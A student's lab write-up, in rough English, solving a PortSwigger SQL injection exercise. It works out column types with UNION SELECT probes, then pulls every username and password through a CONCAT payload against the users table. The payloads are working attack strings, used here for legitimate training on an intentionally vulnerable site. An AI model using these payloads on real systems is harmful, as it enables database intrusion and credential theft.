# SQL injection UNION attack, retrieving multiple values in a single column

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

---

## Lab

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

---

## OWASP Category

SQLi-UNION

---

## Steps to Solve

**Step 1 — Something twisted check it**

We follow the same ste as previous lab [LAB_5]() but here something gone wrong and ater investingate we found that database have 2 columns but both not have accept sting value.

First indetify 2 columns and then we enter this quary to accepted data type by DBMS.
```http
' union select 'a','a'--
```
Then we got internal server error.

<img width="1188" height="414" alt="image" src="https://github.com/user-attachments/assets/47cfd7ce-467e-4b2e-a891-9284925e696e" />

Then we try both value by replacing with null and then we see some quary with diffrent response.
```http
' union select null,'a'--
```

<img width="1171" height="766" alt="image" src="https://github.com/user-attachments/assets/a5c6d721-406f-4dfa-a2ed-a5c96b895615" />

Update this quary more the we got something else also.
```http
' union select 2,'a'--
```

<img width="1476" height="557" alt="image" src="https://github.com/user-attachments/assets/eec341f3-944a-413f-a63c-94c21a64dbca" />

Conformed that 1st column accept **INTEGER** value.

---

**Step 2 — Actual Task**

Now we have clear structure by doing further task as do in LAB_5 and ready for retreive the data from DBMS.
But here in this lab some thing diffrent by purpose of learning we need to take data in **single column by concatenating with one symbol**.

So we can use thi quary:

```http
' union select null,CONCAT(username,':', password) from public.users-- -
```

<img width="1435" height="695" alt="image" src="https://github.com/user-attachments/assets/7e49cc32-9991-4db6-aea7-61a9f50a0c5c" />

We retive all inforamtion related to users that very sensive in one sungle column.

---

**Lab Solved**

<img width="1510" height="672" alt="image" src="https://github.com/user-attachments/assets/c7fff67f-0559-42ad-ac28-be7c75ea6949" />


---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
